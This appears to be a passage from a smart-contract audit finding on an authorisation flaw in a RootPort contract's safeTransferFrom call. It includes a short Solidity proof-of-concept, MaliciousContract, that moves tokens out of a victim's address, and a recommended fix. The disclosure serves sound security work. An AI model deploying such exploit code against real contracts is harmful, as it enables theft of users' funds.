## Proof of Concept

In this example, an attacker deploys the `MaliciousContract` and calls the `performAttack` function, specifying the target address and the amount of tokens to be transferred. By using the vulnerable `transferFrom` function without proper authorization, the attacker can arbitrarily transfer tokens from the target address to their own address.

```solidity
// Attacker's contract
import "./RootPort.sol";

contract MaliciousContract {
    RootPort public hToken;

    constructor(RootPort _hTokenAddress) {
        hToken = RootPort(_hTokenAddress);
    }

    function performAttack(address target, uint256 amount) public {
        // An attacker can manipulate the `_from` parameter
        hToken.safeTransferFrom(target, address(this), amount);
    }
}
```

## Tools Used
Remix IDE.
## Recommended Mitigation Steps
Use `msg.sender` as `from` in safeTransferFrom.
To mitigate this vulnerability and ensure proper security, it is recommended to use `msg.sender` as the `from` parameter in the `safeTransferFrom` function call. This change will ensure that tokens are only transferred on behalf of the user who initiates the transaction, thus preventing unauthorised token transfers.


